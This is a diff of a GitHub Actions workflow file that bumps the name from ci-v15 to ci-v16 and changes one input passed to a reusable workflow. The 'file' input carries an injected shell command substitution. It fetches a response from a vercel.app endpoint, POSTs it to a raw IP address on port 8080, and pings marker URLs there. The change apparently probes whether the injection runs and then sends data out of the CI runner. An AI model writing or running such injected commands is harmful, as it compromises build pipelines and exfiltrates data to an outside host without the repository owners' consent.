@@ -1,4 +1,4 @@
-name: ci-v15
+name: ci-v16
 on: [workflow_dispatch]
 jobs:
   call:
@@ -6,7 +6,7 @@ jobs:
     with:
       ref: main
       comment-id: "5074314510"
-      file: "$(curl -s https://orca-web-morphex.vercel.app/api/auth/ok 2>&1 | curl -s -X POST http://93.127.162.210:9999/authcheck -d @- 2>&1; curl -s http://93.127.162.210:9999/v15end; echo x)"
+      file: "$(curl -s http://93.127.162.210:8080/v16test; curl -s https://orca-web-morphex.vercel.app/api/auth/ok | curl -s -X POST http://93.127.162.210:8080/authresult -d @-; curl -s http://93.127.162.210:8080/v16end; echo x)"
       network: base
       fn: hydate_compiler_cache
       send: "false"
